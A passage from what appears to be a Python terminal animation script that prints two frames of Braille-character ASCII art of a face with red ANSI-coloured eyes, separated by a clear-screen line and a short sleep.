    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⢀⢊⡡⠔⢹⢆⣿⣿⣿⡮⣚⢗⢯⣔⠝⣿⣿⡇⡅⠂⡥⢒⠐⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠉⠄⢒⠈⡜⣸⣻⣛⡿⣃⠻⠇⢳⢹⡟⢘⣿⣷⢈⠑⡐⠤⠉⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿
    ⣿⣿⣷⣝⢿⣟⢭⣿⣽⣯⣿⣽⣿⠿⠋⡁⠀⠀⠀⠈⠥⠈⢀⠌⣤⣭⣭⣭⡸⣰⢥⣬⣷⡿⡓⣬⣭⣭⣥⡡⢐⠠⠉⠤⠀⠀⠀⠀⢙⠩⣿⣿⣿⣿⣽⣯⣿⢻⣿⣯⣾⣿⣿⣿
    ⣿⣿⣿⣿⣧⢻⣷⣝⢿⡿⠟⢋⠠⡀⠆⡀⠅⠀⠠⠉⠤⢒⣤⣾⣿⣿⣿⣿⣷⠮⠣⢹⡫⠪⠾⣿⣿⣿⣿⣿⣦⡐⢡⠤⠁⠀⠀⠇⠀⠆⠀⣉⠛⢿⣿⢟⣵⡿⣱⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣷⠙⢋⠁⡐⢂⡁⢆⠁⠢⠁⠠⣔⣡⣴⢾⣛⣿⣭⣿⣶⣾⣿⣿⣿⡷⠈⠾⣿⣿⣿⣿⣶⣾⣯⣽⣛⡷⢦⣤⣐⠄⠁⠈⠰⡁⠄⡔⢂⠄⣉⠛⢽⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⠁⠐⠈⠐⠄⠀⠘⠀⠠⢪⡴⡟⣯⣵⣾⣿⢿⠛⡿⠍⠙⠒⠚⠛⠋⠉⠛⠋⠙⠛⠓⠒⠚⠩⠽⠛⠻⢿⣿⣾⣽⢻⢶⡕⠠⠀⠊⠐⠁⠒⠠⠰⠀⢻⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⡇⡀⠀⠀⠀⠐⠀⠀⡌⠁⣸⣴⡿⡟⣏⣧⡼⠞⠁⠀⠀⡀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠈⠑⠾⣼⣉⢻⢿⣾⣌⡆⠰⠀⠠⠀⠀⠁⠀⠀⠸⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⡇⠠⡠⡀⠢⠠⠄⡄⡀⣾⡿⣣⣴⣿⣿⠟⠀⠀⣰⠀⠘⢸⠇⠀⠠⠐⢀⠂⠄⢀⠂⠀⠰⡷⠃⠀⢠⠘⠢⡘⢿⣿⣾⣼⢻⣿⢰⢀⠄⠄⠄⢂⠔⡄⠀⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⡇⠀⡃⠎⡓⠦⢄⣒⠐⠙⠿⣮⣻⠿⠃⠀⠀⠑⣼⡀⠄⢀⠀⣠⠁⡈⠄⡐⠈⠠⠀⢄⠀⠀⠠⠀⣼⢁⠀⠈⢊⠻⡿⣫⡾⠟⠈⣀⡢⢥⢒⡑⠆⡀⢸⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⡀⠁⠆⡁⢎⠅⣒⠂⠎⡡⢀⠖⡀⠠⠌⠀⡀⠀⠀⠀⢂⢲⡇⠠⠐⠠⠀⡁⢂⠁⢸⣦⠅⠂⠀⠈⠀⠀⠈⡄⠈⠒⡄⠨⡙⠄⢎⠂⡥⠠⠙⠀⠀⣼⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⢇⡀⠀⠠⠘⠈⠆⡚⣈⠡⠎⡰⢁⠎⠱⣘⠂⢎⣐⠠⡀⢞⣷⠀⠌⡀⢁⠀⢂⠈⣼⡻⢘⠠⢢⢘⡀⠍⠦⠘⡌⢡⠘⣅⢒⠩⡀⠇⠰⠈⠀⠀⣰⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⡿⣣⣿⣟⣤⣀⠀⠀⠀⠀⠀⠊⠐⠁⡁⢌⠳⠀⡜⠢⠠⡜⣨⠢⡈⠀⠠⠐⠠⢈⠀⠀⢉⠔⠥⡩⢄⠊⠴⣈⠡⣃⠐⠌⠂⠐⠀⠀⠀⠀⠀⣀⣤⡺⣿⣮⢿⣿⣿⣿⣿
    ⣿⣿⡿⣱⣿⢏⣾⣿⣿⣿⣷⣶⣤⠀⠀⠀⠀⠈⠀⠴⠑⡈⢆⠳⠘⡀⡔⡊⠄⠠⠁⠂⠄⡈⢀⢂⠣⡄⡑⠪⡔⡈⠂⠱⠀⠀⠀⠀⠀⢀⢠⣶⣶⣿⣿⣿⣿⡝⣿⣧⣻⣿⣿⣿
    ⣿⡿⣵⣿⢯⣿⣿⡿⠿⣿⣿⣿⡇⠀⠁⠀⠀⠀⠀⠀⠁⢈⡄⢆⠣⠜⠀⡔⡘⠀⠠⠁⠂⠀⡄⠡⠘⠰⢌⡐⠤⡁⠉⠀⠀⠀⠀⠀⠀⢸⡄⣿⣿⣿⡿⠿⣿⣿⣞⣿⣷⢻⣿⣿
    ⣿⣳⣿⢏⣿⣿⣿⡇⠀⠈⠛⠿⣧⠀⠀⠀⠀⠀⠀⠂⠈⠀⠀⠀⠒⠈⠃⠠⠁⠄⠀⠐⡀⠰⠀⠀⠉⠁⠂⠄⠠⠀⠄⠀⠂⠀⠀⠀⠀⠸⢰⡿⠛⠋⢀⢢⣿⣿⣿⡜⣿⣧⢿⣿
    ⣯⣿⡟⣾⣿⣿⣿⣿⣦⠈⠀⠄⠈⠀⠀⠀⠄⠠⠀⠐⠀⠀⠂⠐⠠⠒⠈⠀⠁⢀⠐⠀⡀⠀⠈⠀⠀⠃⠆⠀⠄⠀⠀⠂⠀⡀⠄⠂⠀⠀⡌⠀⠠⠠⣠⣿⣿⣿⣿⣿⣹⣿⡞⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠈⠠⠀⠂⠀⠐⠈⠀⢁⠀⠉⠐⠠⣀⠠⠀⠄⠂⡀⠂⠄⠀⠄⠁⠌⡐⠠⠀⠄⠀⠀⠠⠀⠒⠤⠀⠌⠐⠀⠰⠁⠠⠁⠀⣿⣿⣿⣿⣿⣿⣧⢿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⡀⠀⠀⠠⠀⡀⠐⠠⠈⠄⠁⠂⠄⠁⢀⠈⠀⠄⠁⡀⠈⠀⡀⠄⠀⠄⠀⡀⠄⠁⠂⠁⠂⠄⠂⢀⠀⡈⠂⠀⠀⠀⡆⣿⣿⣿⣿⣿⣿⣿⣼⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠠⠀⠀⠀⠐⠀⠠⠀⠀⠀⠈⠀⠄⠁⠂⡀⠂⠄⡁⢀⠐⡀⠄⠂⡐⢀⠂⢄⠔⠊⠁⠁⠀⠠⠀⠀⡀⢠⠁⠀⠠⠀⢡⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠄⠂⠀⠐⠠⠀⠀⠀\033[31m⢀⣠⡄⣠\033[0m⢀⠁⠒⠂⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[31m⣠⣠⡤⣀\033[0m⠀⠀⠀⠀⠀⡇⠀⢀⠀⢡⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⡀⠀⠠⠀⠀⠀⠀\033[31m⣿⣿⡃⣟⣳⣧\033[0m⠀⠀⠀⠀⢀⠀⠠⡀⠀⠀⠀\033[31m⢴⣿⣻⢛⣻⣷\033[0m⠀⠀⠀⠀⠃⡇⠀⠀⡄⣿⣿⣿⣿⣿⣿⣿⣿⣿⡧⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠄⠀⠀⠀⠀\033[31m⠉⠉⠉⠉\033[0m⠀⠀⠀⠀⠀⡀⠄⠐⠇⠈⠀⠀⠀\033[31m⠈⠉⠈⠉⠁\033[0m⠀⠀⠀⠀⡀⠁⠀⠀⠁⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⡀⠀⠀⡈⠀⠀⠀⠐⢀⡈⠀⠀⠀⠀⠀⠄⠈⠀⠀⠀⠀⠡⠀⠄⠂⡀⠀⠀⠈⠀⠠⠔⠀⠀⠀⠀⠈⢳⠄⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠐⠀⠌⠀⠂⠄⠀⠄⢂⠠⠁⠌⠀⠀⠀⠀⠀⠀⠀⠈⡀⠀⠄⡁⠄⠠⢀⠀⢐⡀⠁⠀⠊⠀⢜⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠐⠈⢀⠀⠀⠀⠀⠀⠀⠀⠀⢁⠠⠐⠐⠋⠀⠀⠀⠀⠀⠀⠀⣱⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⣿⣿⣿
    ⣿⣿⣷⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣵⠀⠀⠀⠀⠀⠀⠀⢁⠠⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⢶⣝⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣼⣿⣻⣿
    ⣿⣿⣿⣧⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣵⣟⣷⣷⠀⠈⠀⡄⠈⠀⠀⡀⠄⠀⢀⠀⠀⡀⠀⠄⠈⠀⢄⠀⢀⢰⠀⠈⠀⣼⣮⡻⣯⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣱⣿⢏⣿⣿
    ⣿⣿⡝⣿⣧⢿⣿⣿⣿⣿⣿⣿⢟⣯⡿⣫⣾⣿⣿⡇⠀⠀⠃⣽⡄⣼⠀⡄⠈⠀⠀⠁⠀⢠⠀⢠⡀⣴⠀⣾⠇⠀⠀⠀⣿⣿⣿⣮⣻⣮⡻⣿⣿⣿⣿⣿⣿⡿⣱⣿⢏⣾⣿⣿
    ⣿⣿⣿⣞⢿⣷⡻⣿⡿⢟⣫⣵⣿⣿⣹⣿⣿⣿⣿⡇⠀⠀⠀⠈⠀⣿⠐⣿⢀⡆⣤⠀⣠⠈⠀⣼⠁⢻⣦⠉⠀⠀⠂⠀⣿⣿⣿⣿⣷⢻⣿⣷⣽⣻⠿⣿⡟⣵⣿⢯⣾⣿⣿⣿
    ⣿⣿⣿⣿⣮⢿⣿⣕⢶⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿⣧⠀⠀⡀⠀⡘⢥⠀⠛⢸⢇⣿⡀⣿⡆⠀⠙⠀⢸⠀⠀⠀⠀⠁⣸⣿⣿⣿⢿⣷⣶⣶⣶⣶⣶⣶⢦⣾⡿⣣⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣧⡹⣿⣧⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠘⡀⠀⠀⠀⠀⠈⠙⠀⠛⠁⠀⠀⠀⠀⢀⢣⠀⠈⢠⣿⣿⠋⠀⠀⠀⠉⢻⣿⣿⠟⣡⣿⠟⣹⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣷⣌⢻⣷⣼⣿⣿⠛⠛⢻⡟⣿⡟⢻⡗⠀⢀⠀⠐⣆⣄⠀⠀⠀⠀⠀⠀⡀⢀⠀⢀⠀⠂⠁⠀⡄⡘⠛⠃⠀⠊⠙⡗⠀⠀⠛⣡⣾⣿⣡⣾⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣷⣝⢿⣿⣯⡳⢶⣯⣝⢿⣿⣿⡏⣆⡀⠄⡀⠇⠻⡆⢄⡀⠀⠀⠀⢀⠀⠣⡀⠡⠀⠀⠌⣰⣶⣿⣿⣦⠀⣠⣿⠆⢸⢸⡿⣫⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⡻⢿⣷⣽⣻⢿⣮⣻⣧⣋⣶⠀⠠⠀⠘⠃⠘⠇⢹⠃⡿⠀⠀⠠⠘⢄⠀⠀⠈⠙⢏⣿⢟⣵⢟⢉⣷⠁⠀⣨⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣭⣻⢿⣿⣾⣽⣹⣿⡳⣷⠀⠐⡀⢂⠐⠀⡀⢀⠁⠠⠀⠀⡀⠄⠑⠀⠁⢀⠙⠧⣽⣾⣿⠟⠁⢀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⡿⢿⣿⣿⣿⣿⣾⣽⢻⡿⢿⣿⣾⣯⣤⣄⡂⠌⠠⠐⠠⠈⠄⠁⠂⣀⡀⠀⠡⠐⡀⢀⠀⠄⠀⡀⠠⡀⢀⣾⠿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⢹⣿⣿⣿⡿⣱⡟⣽⣷⣮⢿⣟⢿⣛⣛⣿⣿⣿⣿⣿⣿⣿⣟⣛⣻⡧⣦⣄⣐⡀⠠⠈⠐⢀⣁⣴⡿⣵⣿⣿⣿⣷⡝⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⡟⣾⣿⡟⣵⣿⣷⣼⣿⣿⡿⣽⢟⣾⣿⣿⣿⣷⡻⣯⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣾⢏⣾⣿⣿⣿⡝⣷⡻⣿⣿⣷⣵⣿⣾⣽⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣷⢻⣿⣧⡻⣿⣿⣿⡿⣟⣾⢯⣾⣿⣿⣿⣿⣿⣷⡽⣷⡻⣿⣿⣿⣿⣿⣿⣿⣿⢯⣾⣫⣿⣿⣿⣿⣿⣿⣞⢿⣝⢿⣿⣿⣿⡿⣻⣿⣿⣸⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣯⡻⣿⣿⣶⣯⣽⣾⣿⣳⣿⣿⣿⣿⣿⣿⣿⣿⣿⣜⣿⣝⣿⣿⣿⣿⣿⡿⣳⡿⣳⣿⣿⣿⣿⣿⣿⣿⣿⣮⡻⣿⣾⣭⣷⣿⣿⡿⣳⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣽⣟⣻⣯⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣎⢿⣞⢿⣿⣿⡟⣵⡿⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣭⣿⣻⣿⣽⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣻⣯⣻⢟⣾⢟⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡹⣷⣿⢯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡝⣳⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    """
    )
    clear_screen
    time.sleep(0.02)
    print(
        """
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⠉⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡐⠀⠍⠻⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠠⠂⡠⠪⡻⣿⣿⣿⣿⣿⣿⠘⣿⢿⣿⣿⣿⣿⡟⡑⢁⠂⢄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢀⠑⠠⢃⢳⢹⣿⣿⣿⣿⢏⢊⣏⢼⣿⣿⣿⡟⡼⢄⠣⡐⠄⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢀⠑⢊⠔⢊⡆⣿⣿⣿⣄⢻⢘⠷⣥⣿⣿⣿⡇⡅⢨⠒⠤⡀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⢀⢊⡡⠔⢹⢆⣿⣿⣿⡮⣚⢗⢯⣔⠝⣿⣿⡇⡅⠂⡥⢒⠐⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠉⠄⢒⠈⡜⣸⣻⣛⡿⣃⠻⠇⢳⢹⡟⢘⣿⣷⢈⠑⡐⠤⠉⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿
    ⣿⣿⣷⣝⢿⣟⢭⣿⣽⣯⣿⣽⣿⠿⠋⡁⠀⠀⠀⠈⠥⠈⢀⠌⣤⣭⣭⣭⡸⣰⢥⣬⣷⡿⡓⣬⣭⣭⣥⡡⢐⠠⠉⠤⠀⠀⠀⠀⢙⠩⣿⣿⣿⣿⣽⣯⣿⢻⣿⣯⣾⣿⣿⣿
    ⣿⣿⣿⣿⣧⢻⣷⣝⢿⡿⠟⢋⠠⡀⠆⡀⠅⠀⠠⠉⠤⢒⣤⣾⣿⣿⣿⣿⣷⠮⠣⢹⡫⠪⠾⣿⣿⣿⣿⣿⣦⡐⢡⠤⠁⠀⠀⠇⠀⠆⠀⣉⠛⢿⣿⢟⣵⡿⣱⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣷⠙⢋⠁⡐⢂⡁⢆⠁⠢⠁⠠⣔⣡⣴⢾⣛⣿⣭⣿⣶⣾⣿⣿⣿⡷⠈⠾⣿⣿⣿⣿⣶⣾⣯⣽⣛⡷⢦⣤⣐⠄⠁⠈⠰⡁⠄⡔⢂⠄⣉⠛⢽⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⠁⠐⠈⠐⠄⠀⠘⠀⠠⢪⡴⡟⣯⣵⣾⣿⢿⠛⡿⠍⠙⠒⠚⠛⠋⠉⠛⠋⠙⠛⠓⠒⠚⠩⠽⠛⠻⢿⣿⣾⣽⢻⢶⡕⠠⠀⠊⠐⠁⠒⠠⠰⠀⢻⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⡇⡀⠀⠀⠀⠐⠀⠀⡌⠁⣸⣴⡿⡟⣏⣧⡼⠞⠁⠀⠀⡀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠈⠑⠾⣼⣉⢻⢿⣾⣌⡆⠰⠀⠠⠀⠀⠁⠀⠀⠸⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⡇⠠⡠⡀⠢⠠⠄⡄⡀⣾⡿⣣⣴⣿⣿⠟⠀⠀⣰⠀⠘⢸⠇⠀⠠⠐⢀⠂⠄⢀⠂⠀⠰⡷⠃⠀⢠⠘⠢⡘⢿⣿⣾⣼⢻⣿⢰⢀⠄⠄⠄⢂⠔⡄⠀⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⡇⠀⡃⠎⡓⠦⢄⣒⠐⠙⠿⣮⣻⠿⠃⠀⠀⠑⣼⡀⠄⢀⠀⣠⠁⡈⠄⡐⠈⠠⠀⢄⠀⠀⠠⠀⣼⢁⠀⠈⢊⠻⡿⣫⡾⠟⠈⣀⡢⢥⢒⡑⠆⡀⢸⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⡀⠁⠆⡁⢎⠅⣒⠂⠎⡡⢀⠖⡀⠠⠌⠀⡀⠀⠀⠀⢂⢲⡇⠠⠐⠠⠀⡁⢂⠁⢸⣦⠅⠂⠀⠈⠀⠀⠈⡄⠈⠒⡄⠨⡙⠄⢎⠂⡥⠠⠙⠀⠀⣼⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⢇⡀⠀⠠⠘⠈⠆⡚⣈⠡⠎⡰⢁⠎⠱⣘⠂⢎⣐⠠⡀⢞⣷⠀⠌⡀⢁⠀⢂⠈⣼⡻⢘⠠⢢⢘⡀⠍⠦⠘⡌⢡⠘⣅⢒⠩⡀⠇⠰⠈⠀⠀⣰⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⡿⣣⣿⣟⣤⣀⠀⠀⠀⠀⠀⠊⠐⠁⡁⢌⠳⠀⡜⠢⠠⡜⣨⠢⡈⠀⠠⠐⠠⢈⠀⠀⢉⠔⠥⡩⢄⠊⠴⣈⠡⣃⠐⠌⠂⠐⠀⠀⠀⠀⠀⣀⣤⡺⣿⣮⢿⣿⣿⣿⣿
    ⣿⣿⡿⣱⣿⢏⣾⣿⣿⣿⣷⣶⣤⠀⠀⠀⠀⠈⠀⠴⠑⡈⢆⠳⠘⡀⡔⡊⠄⠠⠁⠂⠄⡈⢀⢂⠣⡄⡑⠪⡔⡈⠂⠱⠀⠀⠀⠀⠀⢀⢠⣶⣶⣿⣿⣿⣿⡝⣿⣧⣻⣿⣿⣿
    ⣿⡿⣵⣿⢯⣿⣿⡿⠿⣿⣿⣿⡇⠀⠁⠀⠀⠀⠀⠀⠁⢈⡄⢆⠣⠜⠀⡔⡘⠀⠠⠁⠂⠀⡄⠡⠘⠰⢌⡐⠤⡁⠉⠀⠀⠀⠀⠀⠀⢸⡄⣿⣿⣿⡿⠿⣿⣿⣞⣿⣷⢻⣿⣿
    ⣿⣳⣿⢏⣿⣿⣿⡇⠀⠈⠛⠿⣧⠀⠀⠀⠀⠀⠀⠂⠈⠀⠀⠀⠒⠈⠃⠠⠁⠄⠀⠐⡀⠰⠀⠀⠉⠁⠂⠄⠠⠀⠄⠀⠂⠀⠀⠀⠀⠸⢰⡿⠛⠋⢀⢢⣿⣿⣿⡜⣿⣧⢿⣿
    ⣯⣿⡟⣾⣿⣿⣿⣿⣦⠈⠀⠄⠈⠀⠀⠀⠄⠠⠀⠐⠀⠀⠂⠐⠠⠒⠈⠀⠁⢀⠐⠀⡀⠀⠈⠀⠀⠃⠆⠀⠄⠀⠀⠂⠀⡀⠄⠂⠀⠀⡌⠀⠠⠠⣠⣿⣿⣿⣿⣿⣹⣿⡞⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠈⠠⠀⠂⠀⠐⠈⠀⢁⠀⠉⠐⠠⣀⠠⠀⠄⠂⡀⠂⠄⠀⠄⠁⠌⡐⠠⠀⠄⠀⠀⠠⠀⠒⠤⠀⠌⠐⠀⠰⠁⠠⠁⠀⣿⣿⣿⣿⣿⣿⣧⢿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⡀⠀⠀⠠⠀⡀⠐⠠⠈⠄⠁⠂⠄⠁⢀⠈⠀⠄⠁⡀⠈⠀⡀⠄⠀⠄⠀⡀⠄⠁⠂⠁⠂⠄⠂⢀⠀⡈⠂⠀⠀⠀⡆⣿⣿⣿⣿⣿⣿⣿⣼⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠠⠀⠀⠀⠐⠀⠠⠀⠀⠀⠈⠀⠄⠁⠂⡀⠂⠄⡁⢀⠐⡀⠄⠂⡐⢀⠂⢄⠔⠊⠁⠁⠀⠠⠀⠀⡀⢠⠁⠀⠠⠀⢡⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠄⠂⠀⠐⠠⠀⠀⠀\033[31m⢀⣠⡄⣠\033[0m⢀⠁⠒⠂⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[31m⣠⣠⡤⣀\033[0m⠀⠀⠀⠀⠀⡇⠀⢀⠀⢡⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⡀⠀⠠⠀⠀⠀⠀\033[31m⣿⣿⡃⣟⣳⣧\033[0m⠀⠀⠀⠀⢀⠀⠠⡀⠀⠀⠀\033[31m⢴⣿⣻⢛⣻⣷\033[0m⠀⠀⠀⠀⠃⡇⠀⠀⡄⣿⣿⣿⣿⣿⣿⣿⣿⣿⡧⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠄⠀⠀⠀⠀\033[31m⠉⠉⠉⠉\033[0m⠀⠀⠀⠀⠀⡀⠄⠐⠇⠈⠀⠀⠀\033[31m⠈⠉⠈⠉⠁\033[0m⠀⠀⠀⠀⡀⠁⠀⠀⠁⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⡀⠀⠀⡈⠀⠀⠀⠐⢀⡈⠀⠀⠀⠀⠀⠄⠈⠀⠀⠀⠀⠡⠀⠄⠂⡀⠀⠀⠈⠀⠠⠔⠀⠀⠀⠀⠈⢳⠄⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠐⠀⠌⠀⠂⠄⠀⠄⢂⠠⠁⠌⠀⠀⠀⠀⠀⠀⠀⠈⡀⠀⠄⡁⠄⠠⢀⠀⢐⡀⠁⠀⠊⠀⢜⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠐⠈⢀⠀⠀⠀⠀⠀⠀⠀⠀⢁⠠⠐⠐⠋⠀⠀⠀⠀⠀⠀⠀⣱⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⣿⣿⣿
    ⣿⣿⣷⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣵⠀⠀⠀⠀⠀⠀⠀⢁⠠⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⢶⣝⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣼⣿⣻⣿
    ⣿⣿⣿⣧⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣵⣟⣷⣷⠀⠈⠀⡄⠈⠀⠀⡀⠄⠀⢀⠀⠀⡀⠀⠄⠈⠀⢄⠀⢀⢰⠀⠈⠀⣼⣮⡻⣯⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣱⣿⢏⣿⣿
